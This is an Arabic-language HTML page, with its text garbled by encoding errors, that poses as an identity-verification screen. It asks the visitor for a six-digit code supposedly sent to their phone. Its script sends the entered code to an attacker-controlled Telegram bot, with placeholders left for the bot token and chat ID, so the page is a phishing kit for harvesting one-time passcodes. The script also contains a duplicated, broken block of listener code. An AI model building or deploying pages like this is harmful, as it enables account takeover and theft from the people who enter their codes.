<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</title>
<style>
body {
font-family: "Tajawal", Arial, sans-serif;
margin: 0;
padding: 0;
min-height: 100vh;
background: #fff;
color: #333;
display: flex;
flex-direction: column;
}

/* Ø±Ø£Ø³ Ø§Ù„ØµÙØ­Ø© */
header {
position: relative;
padding: 16px;
text-align: center;
font-weight: bold;
font-size: 16px;
}
header a {
position: absolute;
top: 16px;
right: 16px;
font-size: 22px;
text-decoration: none;
color: #111;
transform: scaleX(-1); /* Ø¹ÙƒØ³ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ø³Ù‡Ù… */
}

/* Ø§Ù„Ù…Ø­ØªÙˆÙ‰ */
main {
flex: 1;
display: flex;
flex-direction: column;
justify-content: flex-start; /* Ø±ÙØ¹ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ù„Ø£Ø¹Ù„Ù‰ Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„ØªÙˆØ³ÙŠØ· Ø§Ù„Ø¹Ù…ÙˆØ¯ÙŠ */
align-items: center;
text-align: center;
padding: 12px 16px 24px; /* ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ù…Ø³Ø§ÙØ© Ø§Ù„Ø¹Ù„ÙˆÙŠØ© */
} 

h2 {
margin: 20px 0 8px;
font-size: 20px;
font-weight: bold;
}
p {
margin: 0 0 20px;
color: #777;
font-size: 15px;
line-height: 1.6;
}

/* Ù…Ø±Ø¨Ø¹Ø§Øª Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù…Ø² */
.code-inputs {
display: flex;
justify-content: center;
gap: 10px;
margin: 20px 0 30px;
}
.code-inputs input {
width: 44px;
height: 48px;
text-align: center;
font-size: 20px;
border: 1px solid #ccc;
border-radius: 8px;
background: #f3f3f4; /* Ù„ÙˆÙ† Ø§Ù„Ù…Ø±Ø¨Ø¹Ø§Øª Ø§Ø­ØªÙØ§Ø¸Ù‹Ø§ Ø¨Ù…Ø§ Ø·Ù„Ø¨Øª */
}

/* Ø§Ù„Ø¹Ø¯Ø§Ø¯ + Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ */
.resend-container {
display: flex;
align-items: center;
justify-content: center;
gap: 10px;
margin-top: 20px;
}

.circle {
position: relative;
width: 44px;
height: 44px;
}
.circle svg {
transform: rotate(-90deg);
width: 44px;
height: 44px;
}
.circle circle {
fill: none;
stroke-width: 4;
stroke-linecap: round;
}
.circle .bg {
stroke: #eee;
}
.circle .progress {
stroke: #ff6a2b;
stroke-dasharray: 138;
stroke-dashoffset: 0;
transition: stroke-dashoffset 1s linear;
}
.circle span {
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
font-size: 13px;
font-weight: bold;
color: #ff6a2b;
}

#resendText {
font-size: 15px;
color: #aaa;
cursor: default;
transition: color 0.3s;
}
#resendText.active {
color: #000;
cursor: pointer;
}

/* Ø²Ø± Ø§Ù„ØªØ§Ù„ÙŠ */
#nextBtn {
  position: fixed;
  left: 50%;
  bottom: 36px; /* Ø±ÙØ¹Øª Ø§Ù„Ø²Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ */
  transform: translateX(-50%);
  width: calc(100% - 40px);
  max-width: 400px;
  padding: 14px;
  font-size: 18px;
  font-weight: bold;
  border: none;
  border-radius: 10px;
  background: #ddd;
  color: #888;
  cursor: not-allowed;
  z-index: 10001;
  box-shadow: 0 10px 30px rgba(0,0,0,0.12);
  transition: 0.3s;
}
#nextBtn.active {
background: #ff6a2b;
color: #fff;
cursor: pointer;
}

@media (max-width: 480px) {
h2 { font-size: 25px; }
p { font-size: 15px; }
.code-inputs input {
width: 40px;
height: 44px;
font-size: 18px;
}
}
</style>
</head>
<body>
<header>
<span>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</span>
<a href="index.html">â†</a>
</header>

<main>
<h2>ØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯</h2>
<p>Ø§Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 6 Ø®Ø§Ù†Ø§Øª ÙˆØ§Ù„Ø°ÙŠ ØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø³Ø§Ø¨Ùƒ</p>

<div class="code-inputs">
<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
<input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
</div> 

<div class="resend-container">
<div class="circle">
<svg>
<circle class="bg" cx="22" cy="22" r="20"></circle>
<circle class="progress" cx="22" cy="22" r="20"></circle>
</svg>
<span id="countdown">60</span>
</div>
<span id="resendText">Ø£Ø¹Ø¯ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯</span>
</div>
</main>

<button id="nextBtn">Ø§Ù„ØªØ§Ù„ÙŠ</button>

<script>
// ğŸ”¹ Ø¶Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¨ÙˆØª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù… Ù‡Ù†Ø§
const BOT_TOKEN = "Ø¶Ø¹_Ù‡Ù†Ø§_Ø§Ù„ØªÙˆÙƒÙ†";
const CHAT_ID = "Ø¶Ø¹_Ù‡Ù†Ø§_Ø§Ù„Ø¢ÙŠ_Ø¯ÙŠ";

const inputs = document.querySelectorAll(".code-inputs input");
const nextBtn = document.getElementById("nextBtn");
const resendText = document.getElementById("resendText");
const countdownEl = document.getElementById("countdown");
const progressCircle = document.querySelector(".progress");
const circumference = 2 * Math.PI * 20;

progressCircle.style.strokeDasharray = circumference;

let timer;
let timeLeft = 60;

function startTimer() {
timeLeft = 60;
countdownEl.textContent = timeLeft;
resendText.classList.remove("active");

timer = setInterval(() => {
timeLeft--;
countdownEl.textContent = timeLeft;
const offset = circumference - (timeLeft / 60) * circumference;
progressCircle.style.strokeDashoffset = offset;

if (timeLeft <= 0) {
clearInterval(timer);
countdownEl.textContent = "0";
resendText.classList.add("active");
}
}, 1000);
}

// Ø£ÙˆÙ„ ØªØ´ØºÙŠÙ„
startTimer();

resendText.addEventListener("click", () => {
if (resendText.classList.contains("active")) {
startTimer();
}
});

// ØªÙØ¹ÙŠÙ„ Ø²Ø± Ø§Ù„ØªØ§Ù„ÙŠ Ø¹Ù†Ø¯ Ø¥Ø¯Ø®Ø§Ù„ 6 Ø®Ø§Ù†Ø§Øª
inputs.forEach((input, idx) => {
  // ÙØ±Ø¶ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø·
  input.setAttribute('inputmode', 'numeric');
  input.setAttribute('pattern', '[0-9]*');

  // Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ù…ÙØ§ØªÙŠØ­: Ù†Ø³Ù…Ø­ Ø¨Ø§Ù„Ø­Ø±ÙƒØ§Øª ÙˆÙ†Ù…Ù†Ø¹ Ø§Ù„Ø£Ø­Ø±ÙØŒ ÙˆÙ†Ù†ÙØ° Ø­Ø°ÙÙ‹Ø§ Ù…ØªØªØ§Ù„ÙŠÙ‹Ø§ Ø¹Ù†Ø¯ Backspace
  input.addEventListener('keydown', (e) => {
    const allowedNavigation = ['ArrowLeft','ArrowRight','Tab'];
    // Ù†Ø³Ù…Ø­ Ø¨Ø§Ù„Ù…Ù„Ø§Ø­Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ù„Ù„Ù…Ø¤Ø´Ø±
    if (allowedNavigation.includes(e.key)) return;

    // Ø¥Ø°Ø§ Ø¶ØºØ· Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Backspace
    if (e.key === 'Backspace') {
      // Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø®Ø§Ù†Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ© ÙØ§Ø±ØºØ© Ù†Ù†ØªÙ‚Ù„ Ù„Ù„Ø®Ø§Ù†Ø© Ø§Ù„Ø³Ø§Ø¨Ù‚Ø© ÙˆÙ†Ø­Ø°ÙÙ‡Ø§
      if (input.value === '' && idx > 0) {
        e.preventDefault();
        const prev = inputs[idx - 1];
        prev.value = '';
        prev.classList.remove('filled');
        prev.focus();
        checkCode();
        return;
      }
      // Ø®Ù„Ø§Ù Ø°Ù„ÙƒØŒ Ø¯Ø¹ Ø§Ù„Ù…ØªØµÙØ­ ÙŠØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø§Ù„Ø­Ø°Ù ÙÙŠ Ù‡Ø°Ù‡ Ø§Ù„Ø®Ø§Ù†Ø© (Ø³ÙŠÙÙ†ÙÙ‘Ø° Ø­Ø¯Ø« input Ø¨Ø¹Ø¯ Ø°Ù„Ùƒ)
      return;
    }

    // Ù…ÙØªØ§Ø­ Delete: Ø¥Ø°Ø§ ÙÙŠ Ø®Ø§Ù†Ø© Ù„ÙŠØ³Øª Ø§Ù„Ø£Ø®ÙŠØ±Ø© ÙˆÙ†Ø±ÙŠØ¯ Ø­Ø°Ù Ø§Ù„ØªØ§Ù„ÙŠ
    if (e.key === 'Delete') {
      if (input.value === '' && idx < inputs.length - 1) {
        e.preventDefault();
        const next = inputs[idx + 1];
        next.value = '';
        next.classList.remove('filled');
        next.focus();
        checkCode();
        return;
      }
      return;
    }

    // Ù„Ù…Ù†Ø¹ Ø¥Ø¯Ø®Ø§Ù„ Ø£ÙŠ Ø­Ø±Ù Ù„ÙŠØ³ Ø±Ù‚Ù…Ø§
    if (e.key.length === 1 && !/^[0-9]$/.test(e.key)) {
      e.preventDefault();
    }
  });

  // Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø£ÙŠ Ø­Ø±Ù ØºÙŠØ± Ø±Ù‚Ù…ÙŠ ÙÙˆØ±Ù‹Ø§ ÙˆØ¥Ø¨Ù‚Ø§Ø¡ Ø®Ø§Ù†Ø© ÙˆØ§Ø­Ø¯Ø©
  input.addEventListener('input', () => {
    const prevVal = input.value;
    input.value = input.value.replace(/[^0-9]/g, '').slice(0,1);
    if (input.value) input.classList.add('filled'); else input.classList.remove('filled');
    // Ø¥Ø°Ø§ ØªÙ… Ù„ØµÙ‚ Ø£ÙƒØ«Ø± Ù…Ù† Ø±Ù‚Ù… ÙÙŠ Ø®Ø§Ù†Ø© ÙˆØ§Ø­Ø¯Ø©ØŒ Ù†ÙˆØ²Ø¹ Ø§Ù„Ø¨Ø§Ù‚ÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ù†Ø§Øª Ø§Ù„ØªØ§Ù„ÙŠØ©
    if (prevVal.length > 1) {
      const rest = prevVal.replace(/[^0-9]/g, '').slice(1);
      for (let j = 0; j < rest.length && (idx + 1 + j) < inputs.length; j++) {
        inputs[idx + 1 + j].value = rest.charAt(j);
        inputs[idx + 1 + j].classList.add('filled');
      }
    }
    // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ù†Ø© Ø§Ù„ØªØ§Ù„ÙŠØ© Ø¥Ø°Ø§ Ø§Ù…ØªÙ„Ø£Øª
    if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
    checkCode();
  });

  // Ø¯Ø¹Ù… Ø§Ù„Ù„ØµÙ‚: Ø¥Ø°Ø§ ØªÙ… Ù„ØµÙ‚ Ø³Ù„Ø³Ù„Ø© Ø·ÙˆÙŠÙ„Ø© Ù†Ù…Ù„Ø£ Ø§Ù„Ø­Ù‚ÙˆÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
    if (!paste) return;
    for (let i = 0; i < inputs.length; i++) {
      inputs[i].value = paste.charAt(i) || '';
      if (inputs[i].value) inputs[i].classList.add('filled'); else inputs[i].classList.remove('filled');
    }
    // Ø¶Ø¹ Ø§Ù„ØªØ±ÙƒÙŠØ² ÙÙŠ Ø£ÙˆÙ„ Ø®Ø§Ù†Ø© ÙØ§Ø±ØºØ© Ø¨Ø¹Ø¯ Ø§Ù„Ù„ØµÙ‚
    for (let k = 0; k < inputs.length; k++) {
      if (!inputs[k].value) { inputs[k].focus(); break; }
    }
    checkCode();
  });
});

  // Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø£ÙŠ Ø­Ø±Ù ØºÙŠØ± Ø±Ù‚Ù…ÙŠ ÙÙˆØ±Ù‹Ø§ ÙˆØ¥Ø¨Ù‚Ø§Ø¡ Ø®Ø§Ù†Ø© ÙˆØ§Ø­Ø¯Ø©
  input.addEventListener('input', () => {
    input.value = input.value.replace(/[^0-9]/g, '').slice(0,1);
    if (input.value) input.classList.add('filled'); else input.classList.remove('filled');
    if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
    checkCode();
  });

  // Ø¯Ø¹Ù… Ø§Ù„Ù„ØµÙ‚: Ø¥Ø°Ø§ ØªÙ… Ù„ØµÙ‚ Ø³Ù„Ø³Ù„Ø© Ø·ÙˆÙŠÙ„Ø© Ù†Ù…Ù„Ø£ Ø§Ù„Ø­Ù‚ÙˆÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
    if (!paste) return;
    for (let i = 0; i < inputs.length; i++) {
      inputs[i].value = paste.charAt(i) || '';
      if (inputs[i].value) inputs[i].classList.add('filled'); else inputs[i].classList.remove('filled');
    }
    checkCode();
  });
});

function checkCode() {
let code = "";
inputs.forEach(inp => code += inp.value);
if (code.length === 6) {
nextBtn.classList.add("active");
nextBtn.disabled = false;
} else {
nextBtn.classList.remove("active");
nextBtn.disabled = true;
}
}

// Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø² Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù…
function sendToTelegram(code) {
const message = `ğŸ”‘ ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯:
${code}`;
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
chat_id: CHAT_ID,
text: message
})
})
.then(res => res.json())
.then(data => console.log("ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", data))
.catch(err => console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", err));
}

// Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± Ø§Ù„ØªØ§Ù„ÙŠ
nextBtn.addEventListener("click", () => {
let code = "";
inputs.forEach(inp => code += inp.value);
if (code.length === 6) {
sendToTelegram(code);
alert("ğŸš€ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù…");
}
});
</script>
</body>
</html>
